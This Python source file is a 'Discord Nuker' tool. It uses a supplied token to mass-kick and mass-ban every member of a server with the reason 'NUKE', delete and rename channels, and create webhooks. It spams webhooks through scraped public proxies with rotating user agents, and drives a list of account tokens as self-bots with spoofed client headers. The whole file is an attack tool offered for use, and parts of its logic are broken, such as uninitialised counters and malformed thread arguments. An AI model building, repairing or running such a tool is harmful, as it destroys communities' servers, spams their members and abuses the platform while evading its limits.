import requests
import json
import pathlib 
import time
import websocket
import base64
import random
import os
import socket
import colorama
import sys
import pypresence
import threading
import humanize
import update_check

lock = threading.Lock()

from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

class Colour:
    YELLOW = Fore.YELLOW
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    RED = Fore.RED
    GREEN = Fore.GREEN
    MAGENTA = Fore.MAGENTA

class URL:
    Github = "https://github.com/reactxsw"
    Repository = "https://github.com/reactxsw/react-nuker/blob/main/main.py"
    RAW_mainpy = "https://raw.githubusercontent.com/reactxsw/react-nuker/main/main.py"
    RAW_configjson = "https://raw.githubusercontent.com/reactxsw/react-nuker/main/config.json"

    DiscordWebsocket = "wss://gateway.discord.gg/?v=9&encoding=json"
    BaseURL = "https://discord.com/api/v9/"
    WebhookURL = "https://discord.com/api/webhooks/"
    Proxy = {
        "ProxyUrls": {
            "ProxyScrape-Https": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=https",
            "ProxyScrape-Http": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=http",
            "ProxyScrape-Socks4": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=socks4",
            "ProxyScrape-Socks5": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=socks5",
            "ProxyScrape-All": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=all",
            "TheSpeedX-Socks5": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "TheSpeedX-Socks4": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "TheSpeedX-Http": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "ShiftyTR-Http": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "ShiftyTR-Https": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
            "ShiftyTR-All": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
            "ShiftyTR-Socks4": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
            "ShiftyTR-Socks5": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "Sunny9577-All": "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "Hookzof-All": "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "Clarketm-All": "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
        }
    }

class Update:
    def __init__(self):
        self.Repository = {
            "main.py" : f"{URL.RAW_mainpy}",
            "config.json" : f"{URL.RAW_configjson}"
        }

    def UpdateProgram(self):
        for File , Url in self.Repository.items():
            print(File)
            print(Url)
            if update_check.isUpToDate(File,Url)== False:
                print("there is an update")
                input()

class Infomation:
    def __init__(self):
        self.Author = "REACT#1120"
        self.__VERSION__ = "1.3.0"
        self.Github = URL.Github
        self.Repository = URL.Repository

class Status:
    SuccessStatus = [200,201,204]

    def Fail(Text):
        lock.acquire()
        print(f"                          {Style.BRIGHT}{Colour.RED} [{Colour.WHITE}FAIL{Colour.MAGENTA}] {Text}")
        lock.release()

    def Success(Text):
        lock.acquire()
        print(f"                          {Style.BRIGHT}{Colour.GREEN} [{Colour.WHITE}SUCCESS{Colour.MAGENTA}] {Text}")
        lock.release()
    
    def Ratelimit(Text):
        lock.acquire()
        print(f"                          {Style.BRIGHT}{Colour.MAGENTA} [{Colour.WHITE}RATELIMIT{Colour.MAGENTA}] {Text}")
        lock.release()

class Constant:
    Blank = "_____________________________________"
    RPC = False
    if pathlib.Path("config.json").exists():
        START = True
        with open('config.json') as setting:
            config = json.load(setting)
        
        SERVER_ID = config.get("SERVER_ID")
        TOKEN = config.get("TOKEN")
        INVITE_CODE = config.get("INVITE_CODE")

        if SERVER_ID == Blank:
            SERVER_ID = False
        
        if TOKEN == Blank:
            TOKEN = False
        
        if INVITE_CODE == Blank:
            INVITE_CODE = False
        
    else:
        START=False
        with open("config.json", "w") as setting:
            setting.writelines(
                [
                    "{",
                        "\n"
                        "    "+f'"SERVER_ID": "{Blank}",',
                        "\n",
                        "    "+f'"TOKEN": "{Blank}",',
                        "\n",
                        "    "+f'"INVITE_CODE": "{Blank}"',
                        "\n",
                    "}"
                ]
            )
    
    VOICE_ID = "873904278346010734"
    CLIENT_ID = "794921074768216126"
    LARGE_IMAGE = "smilewinlogo"
    IP_ADDR = socket.gethostbyname(socket.gethostname())
    os.system("title Disocrd Nuker BY REACT#1120")


    if pathlib.Path("tokens.txt").exists():
        with open("tokens.txt") as f:
            TOKENS = [x.strip() for x in f.readlines()] 
    else:
        file = open("tokens.txt", "w") 

class ProxyIP:
    ProxyURL = URL.Proxy["ProxyUrls"].items()
    def GetProxies():
        ProxyList = []
        ProxyFile = "Proxy.txt"

        URL = 0 
        HTTP = 0
        HTTPS = 0
        SOCKS4 = 0
        SOCKS5 = 0

        for Provider, Url in ProxyIP.ProxyURL:
            Proxies = requests.get(Url).text.split("\n")
            URL = URL +1 

            for Proxy in Proxies:
                Proxy = Proxy.strip()

                if Proxy not in ProxyList:
                    Type = Provider.split("-")[1]

                    if Type == "Http":
                        ProxyList.append(f"http://{Proxy}")
                        HTTP = HTTP + 1 
                    
                    elif Type == "Https":
                        ProxyList.append(f"https://{Proxy}")
                        HTTPS = HTTPS + 1 
                    
                    elif Type == "Socks4":
                        ProxyList.append(f"socks4://{Proxy}")
                        SOCKS4 = SOCKS4 + 1 
                    
                    elif Type == "Socks5":
                        ProxyList.append(f"socks5://{Proxy}")
                        SOCKS5 = SOCKS5 + 1 
                    
                    else:
                        pass

        print(f"""
            {humanize.intcomma(len(ProxyList))} proxies was scraped from {URL} urls 
            {humanize.intcomma(HTTP)} http 
            {humanize.intcomma(HTTPS)} https 
            {humanize.intcomma(SOCKS4)} socks4 
            {humanize.intcomma(SOCKS5)} socks5""")
        
        return ProxyList

class Function:

    def Credit():
        print(Infomation().Author)
        print(Infomation().__VERSION__)
        print(Infomation().Github)

    def DiscordRPC():
        if Constant.RPC is True:
            RPC = pypresence.Presence(Constant.CLIENT_ID)  
            RPC.connect() 
            RPC.update(state="Hacking",details="Smilewin discord server", join="https discord.gg/3UJFaRvJRC" ,large_image=Constant.LARGE_IMAGE,start=time.time())
        
        else:
            pass
        
    def CheckInternet():
        try:
            host = socket.gethostbyname("1.1.1.1")
            s = socket.create_connection((host, 80), 2)
            s.close()
            return True 
        except:
            pass
        return False
    
    def Clear():
        os.system("cls" if os.name == "nt" else "clear")
    
    def Spinner():
        l = ['|', '/', '-', '\\']
        for i in l*3:
            sys.stdout.write('\r' + Style.BRIGHT + Fore.YELLOW +'Loading... '+i)
            sys.stdout.flush()
            time.sleep(0.075)

    def Menu():
        logo = f"""                 
                                            ____  _____    _    ____ _____ 
                                           |  _ \| ____|  / \  / ___|_   _|
                                           | |_) |  _|   / _ \| |     | |  
                                           |  _ <| |___ / ___ \ |___  | |  
                                           |_| \_\_____/_/   \_\____| |_| V. {Infomation().__VERSION__}"""
        print(Fore.CYAN +f"{logo}\n")
        print(f"{Colour.YELLOW}                   ╔═════════════════════╦═════════════════════╦═════════════════════╦═════════════════════╗")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}1{Colour.CYAN}] Scrape Channels {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}9{Colour.CYAN}] Spam Webhook    {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}17{Colour.CYAN}]Livestream      {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}25{Colour.CYAN}]Livestream      {Colour.YELLOW}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}2{Colour.CYAN}] Scrape Members  {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}10{Colour.CYAN}]Connect         {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}18{Colour.CYAN}]Create Channels {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}26{Colour.CYAN}]Livestream      {Colour.YELLOW}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}3{Colour.CYAN}] Scrape Roles    {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}11{Colour.CYAN}]Online          {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}19{Colour.CYAN}]Delete Channels {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}27{Colour.CYAN}]Livestream      {Colour.YELLOW}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}4{Colour.CYAN}] Kick            {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}12{Colour.CYAN}]Livestream      {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}20{Colour.CYAN}]Channel Name    {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}28{Colour.CYAN}]Livestream      {Colour.YELLOW}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}5{Colour.CYAN}] Ban             {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}13{Colour.CYAN}]Create Channels {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}21{Colour.CYAN}]Join            {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}29{Colour.CYAN}]Livestream      {Colour.YELLOW}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}6{Colour.CYAN}] Join            {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}14{Colour.CYAN}]Delete Channels {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}22{Colour.CYAN}]Join            {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}30{Colour.CYAN}]Livestream      {Colour.YELLOW}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}7{Colour.CYAN}] Leave           {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}15{Colour.CYAN}]Channel Name    {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}23{Colour.CYAN}]Join            {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}31{Colour.CYAN}]Livestream      {Colour.YELLOW}║")
        print(f"{Colour.YELLOW}                   ║{Colour.CYAN} [{Colour.WHITE}8{Colour.CYAN}] Create Webhook  {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}16{Colour.CYAN}]Channel Name    {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}24{Colour.CYAN}]Join            {Colour.YELLOW}║{Colour.CYAN} [{Colour.WHITE}32{Colour.CYAN}]{Colour.RED}Exit            {Colour.YELLOW}║")
        print(f"{Colour.YELLOW}                   ╚═════════════════════╩═════════════════════╩═════════════════════╩═════════════════════╝")

class ReqHeader:

    def UserAgent():
        
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Linux i686; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.31"
            ])

    def DiscordHeader():
        UA = ReqHeader.UserAgent()
        if requests.get(f"{URL.BaseURL}users/@me", headers={"Authorization": Constant.TOKEN}).status_code == 200:
            return {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "authorization": f"{Constant.TOKEN}",
                "user-agent": f"{UA}",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": base64.b64encode(str({
                        "os": "Windows",
                        "browser": "Chrome",
                        "device": "",
                        "system_locale": "en-US",
                        "browser_user_agent": f"{UA}",
                        "browser_version": "91.0.4472.101",
                        "os_version": "10",
                        "referrer": f"https://discord.com/register",
                        "referring_domain": "",
                        "referrer_current": "",
                        "referring_domain_current": "",
                        "release_channel": "stable",
                        "client_build_number": 87598,
                        "client_event_source": None
                    }).encode()).decode()
                }
        else:
            return {
                "Authorization": f"Bot {Constant.TOKEN}"
                }

class Data:

    def GetChannel_ID():
        if Constant.TOKEN is True:
            channel_id = [] 
            channels = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers= ReqHeader.DiscordHeader()).json()
            for i in range(len(channels)):
                channel_id.append(channels[i]["id"])

            return channel_id
        
        else:
            pass
    
    def GetRole_ID():
        if Constant.TOKEN is True:
            role_id = []
            roles = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles", headers= ReqHeader.DiscordHeader()).json()
            for i in range(len(roles)):
                role_id.append(roles[i]["id"])

            return role_id

        else:
            pass

    def GetMember_ID():
        if Constant.TOKEN is True:
            member_id = []
            members = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/members?limit=1000", headers= ReqHeader.DiscordHeader()).json()
            for i in range(len(members)):
                member_id.append(members[i]["user"]["id"])

            return member_id
        
        else:
            pass
    

class Discord:

    def SendWebhook(Webhook_URL, Message,Proxy):
        try:
            response =  requests.post(Webhook_URL, headers={
                "content-type": "application/json",
                "user-agent": f"{ReqHeader.UserAgent()}"
                },
                    json={
                        "content" : Message,
                        "username" : "REACT",
                        "avatar_url": "https://avatars.githubusercontent.com/u/70201574?v=4"
                    },
                        proxies={
                            "http" : Proxy, "https" : Proxy
                            })

            if response.status_code in Status.SuccessStatus:
                Status.Success(f"MESSAGE SENT")
            
            else:
                Status.Fail(f"MESSAGE NOT SENT")

        except:
            pass

    def CreateChannel(ChannelName):
        response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers=ReqHeader.DiscordHeader(), json = {
            'name': ChannelName,
            'type': 0
        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Channel {ChannelName}")
        
        elif response.status_code == 429:
            Status.Ratelimit(f"")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateChannel, args=(ChannelName)).start()

        else:
            print(f"Couldn't Create Channel {ChannelName}")


    def DeleteChannel(channel):
        try:
            response = requests.delete(f"{URL.BaseURL}channels/{channel}", headers=ReqHeader.DiscordHeader())
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Deleted Channel {channel.strip()}\n")
            else:
                print(f"Couldn't Delete Channel {channel.strip()}\n")
        except:
            pass

    def Ban(Member):
        try:
            response = requests.put(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/bans/{Member}", headers=ReqHeader.DiscordHeader(), json = {
                'delete_message_days': '7',
                'reason': 'NUKE'
            })
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Banned {Member.strip()}")

            elif response.status_code == 429:
                time.sleep(0.05)
                threading.Thread(target=Discord.Ban, args=(Member)).start()
                
            else:
                Status.Fail(f"Failed to ban {Member.strip()}")

        except:
            pass

    def Kick(Member):
        try:
            response = requests.delete(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/members/{Member}", headers=ReqHeader.DiscordHeader(), json = {
                'delete_message_days': '7',
                'reason': 'NUKE'
            })
            if response.status_code in Status.SuccessStatus:
                Status.Success(f" [SUCCESS] {Member.strip()}")

            elif response.status_code == 429:
                time.sleep(0.05)
                threading.Thread(target=Discord.Kick, args=(Member)).start()
            
            else:
                Status.Fail(f" [FAILED] {Member.strip()}")
                
        except:
            pass
    
    def ChangeChannelName(Channel , ChannelName):
        response = requests.patch(f"{URL.BaseURL}channels/{Channel}", headers=ReqHeader.DiscordHeader(), json={
            "name": f"{ChannelName}"
        })

        if response.status_code in Status.SuccessStatus:
            Status.Success(f" [SUCCESS] CHANNEL NAME CHANGED")
        
        elif response.status_code == 429:
            time.sleep(0.05)
            threading.Thread(target=Discord.ChangeChannelName,args=(Channel)).start()

        else:
            Status.Fail(f" [FAILED] CHANNEL NAME NOT CHANGED")

    def CreateWebhook(Channel):
        response = requests.post(f"{URL.BaseURL}channels/{Channel}/webhooks", json={
            "name": "REACT"
            }, headers= ReqHeader.DiscordHeader())

        if response.status_code in Status.SuccessStatus:
            Status.Success(f" [SUCCESS] WEBHOOK CREATED")

        elif response.status_code == 429:
            threading.Thread(target=Discord.CreateWebhook,args=(Channel)).start()
        
        else:
            Status.Fail(f" [FAILED] WEBHOOK NOT CREATED")

    def Join(token):
        response = requests.post(f"{URL.BaseURL}invites/{Constant.INVITE_CODE}", headers= ReqHeader.DiscordHeader())
        if response.status_code in Status.SuccessStatus:
            Status.Success(f" [SUCCESS] TOKEN : {token} JOINED")
        
        elif response.status_code == 429:
            threading.Thread(target=Discord.Join,args=(token)).start()

        else:
            Status.Fail(f" [FAILED] TOKEN : {token} NOT JOINED")

    def Leave(token):   
        response = requests.delete(f"{URL.BaseURL}users/@me/guilds/{Constant.SERVER_ID}", json={"lurking": "false"} , headers=ReqHeader())
        if response.status_code in Status.SuccessStatus:
            Status.Success(f" [SUCCESS] TOKEN : {token} LEAVE")
        
        elif response.status_code == 429:
            threading.Thread(target=Discord.Leave,args=(token)).start()
        
        else:
            Status.Fail(f" [FAILED] TOKEN : {token} NOT LEAVE")

    def Connect(token,VOICE_ID):
        ws = websocket.WebSocket()
        ws.connect(URL.DiscordWebsocket)
        RECV = json.loads(ws.recv())
        heartbeat_interval = RECV['d']['heartbeat_interval']
        ws.send(json.dumps({
                    "op":2,
                    "d": {
                        "token":token, 
                        "properties": {
                            "$os":"windows",
                            "$browser":"Discord",
                            "$device": "desktop" 
                            }
                        }
                    }))
        ws.send(json.dumps({
                    "op":4,
                    "d": {
                        "guild_id":Constant.SERVER_ID, 
                        "channel_id": VOICE_ID,
                        "self_mute":True,
                        "self_deaf":True
                    }
                }))
        while True:
            time.sleep(heartbeat_interval/1000)
            try:
                ws.send(json.dumps({
                    "op":1,
                    "d":None}))
            except Exception:
                break

    def Online(token):
        ws = websocket.WebSocket()
        ws.connect(URL.DiscordWebsocket)
        RECV = json.loads(ws.recv())
        heartbeat_interval = RECV['d']['heartbeat_interval']
        while True:
            time.sleep(heartbeat_interval/1000)
            try:
                ws.send(json.dumps({
                    "op":1,
                    "d":None}))
            except Exception:
                break

    def Livestream(token, VOICE_ID):
        ws = websocket.WebSocket()
        ws.connect(URL.DiscordWebsocket)
        RECV = json.loads(ws.recv())
        heartbeat_interval = RECV['d']['heartbeat_interval']
        ws.send(json.dumps({
                    "op":2,
                    "d": {
                        "token":token, 
                        "properties": {
                            "$os":"windows",
                            "$browser":"Discord",
                            "$device": "desktop" 
                            }
                        }
                    }))
        ws.send(json.dumps({
                    "op":4,
                    "d": {
                        "guild_id":Constant.SERVER_ID, 
                        "channel_id": VOICE_ID,
                        "self_mute":True,
                        "self_deaf":True
                    }
                }))
        ws.send(json.dumps({
            "op":18,
            "d": {
                "type":"guild",
                "guild_id":Constant.SERVER_ID, 
                "channel_id": VOICE_ID,
                "preferred_region":"singapore"
                }
            }))
        while True:
            time.sleep(heartbeat_interval/1000)
            try:
                ws.send(json.dumps({
                    "op":1,
                    "d":None}))
            except Exception:
                break

class ThreadFunction:

    def Channel_ID():
        print(Data.GetChannel_ID())
    
    def Member_ID():
        print(Data.GetMember_ID())
    
    def Role_ID():
        print(Data.GetRole_ID())

    def ThreadChangeChannelName():
        Channels = Data.GetChannel_ID()
        
    def ThreadSpamWebhook(ProxyList):
        Threads =[] 
        while True:
            Webhook_url = input(f"{Colour.YELLOW}                        Webhook URL : ")
            if URL.WebhookURL in Webhook_url and requests.get(Webhook_url).status_code == 200:
                break
                
            else:
                print("Invalid Webhook URL")

        Message = input(">")

        while True:
            try:
                for i in range(int(input(">"))):
                    Proxy = random.choice(ProxyList)
                    print(f"[{i}] {Proxy}")
                    t = threading.Thread(target=Discord.SendWebhook, args=(Webhook_url,Message,Proxy))
                    Threads.append(t)
                
                for Thread in Threads:
                    Thread.start()

                for Thread in Threads:
                    Thread.join()
                
                break 

            except ValueError:
                print("Number of thread should only be an integer")

    def ThreadKick():
        if Constant.TOKEN is True and Constant.SERVER_ID is True:
            Members = Data.GetMember_ID()
            
            Member_1 = []
            Member_2 = []
            Member_3 = []
            Member_4 = []

            for Member in Members:
                if len(Member_1) != round(len(Members)/4):
                    Member_1.append(Member)
                
                elif len(Member_2) != round(len(Members)/4):
                    Member_2.append(Member)
                
                elif len(Member_3) != round(len(Members)/4):
                    Member_3.append(Member)
                
                elif len(Member_4) != round(len(Members)/4):
                    Member_4.append(Member)
                
                else:
                    pass
                
            while True:
                try:
                    threading.Thread(target=Discord.Kick, args=(Member_1[num])).start()
                    threading.Thread(target=Discord.Kick, args=(Member_2[num])).start()
                    threading.Thread(target=Discord.Kick, args=(Member_3[num])).start()
                    threading.Thread(target=Discord.Kick, args=(Member_4[num])).start()

                except IndexError:
                    break

                except:
                    pass

                try:
                    threading.Thread(target=Discord.Kick, args=(Member_4[num])).start()

                except IndexError:
                    break

                except:
                    pass

                num = num + 1
        
        else:
            print("")

    def ThreadBan():
        if Constant.TOKEN is True and Constant.SERVER_ID is True:
            Members = Data.GetMember_ID()
            
            Member_1 = []
            Member_2 = []
            Member_3 = []
            Member_4 = []

            for Member in Members:
                if len(Member_1) != round(len(Members)/4):
                    Member_1.append(Member)
                
                elif len(Member_2) != round(len(Members)/4):
                    Member_2.append(Member)
                
                elif len(Member_3) != round(len(Members)/4):
                    Member_3.append(Member)
                
                elif len(Member_4) != round(len(Members)/4):
                    Member_4.append(Member)
                
                else:
                    pass
            
            while num > round(len(Members/4)):
                try:
                    threading.Thread(target=Discord.Ban, args=(Member_1[num])).start()
                    threading.Thread(target=Discord.Ban, args=(Member_2[num])).start()
                    threading.Thread(target=Discord.Ban, args=(Member_3[num])).start()
                    threading.Thread(target=Discord.Ban, args=(Member_4[num])).start()
                    num = num + 1

                except IndexError:
                    break

                except:
                    pass 
        
        else:
            print("")


    def ThreadLivestream():
        if not Constant.SERVER_ID is True:

            VOICE_ID = input(f"{Colour.YELLOW}                        Voice channel ID : ")
            threads_create = [] 
            with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                for token in Constant.TOKENS:
                    threads_create.append(executor.submit(Discord.Livestream,token,VOICE_ID))
        
        else:
            print("")
    
    def ThreadConnect():
        if not Constant.SERVER_ID is True:

            VOICE_ID = input("                        Voice channel ID : ")
            threads_create = [] 
            with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                for token in Constant.TOKENS:
                    threads_create.append(executor.submit(Discord.Connect,token,VOICE_ID))

        else:
            pass

    def ThreadOnline():
        if not Constant.SERVER_ID is True:
            threads_create = [] 
            with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                for token in Constant.TOKENS:
                    threads_create.append(executor.submit(Discord.Online,token))
        else:
            print("")

class Main:

    FunctionDict = {
        1: ThreadFunction.Channel_ID, 
        2: ThreadFunction.Member_ID,
        3: ThreadFunction.Role_ID, 
        4: ThreadFunction.ThreadKick,
        5: ThreadFunction.ThreadBan,
        6: Discord.Join,
        7: Discord.Leave, 
        8: Discord.CreateWebhook,
        9: ThreadFunction.ThreadSpamWebhook,
        10: ThreadFunction.ThreadConnect, 
        11: ThreadFunction.ThreadOnline,
        12: ThreadFunction.ThreadLivestream,
        13: Discord.CreateChannel,
        14: Discord.DeleteChannel,
        15: Discord.ChangeChannelName,
        #16:
        #17:
        #18:
        #19:
        #20:
        #21:
        #22:
        #23:
        #24:
        #25:
        #26:
        #27:
        #28:
        #29:
        #30:
        #31:
        32: exit
    }
     
    def run(Proxy= None, Getproxy = True):
        if Function.CheckInternet() is True:
            Function.DiscordRPC()
            Function.Clear()
            Function.Menu()
            Update().UpdateProgram()
            if Getproxy == False or Proxy is None:
                Proxy = ProxyIP.GetProxies()
            while True:
                try:    
                    Main.FunctionDict[int(input(f"                          {Colour.YELLOW}ROOT{Colour.WHITE}@{Colour.YELLOW}REACT>> "))](Proxy)

                    if input("CONTINUE ? [ Y/N ]").upper() in ["Y","YES"]:
                        Main.run(Proxy)

                        break
                    
                    else:
                        exit()
                
                except (ValueError, KeyError):
                    print("Invalid choice")

        else:
            Function.Clear()
            print("No Internet Connection")

def start(START=False):
    if START is True:
        Function.Spinner()
        try:
            Main.run()
        except Exception as e:
            print(e)
    else:
        print("sss")

start(Constant.START)
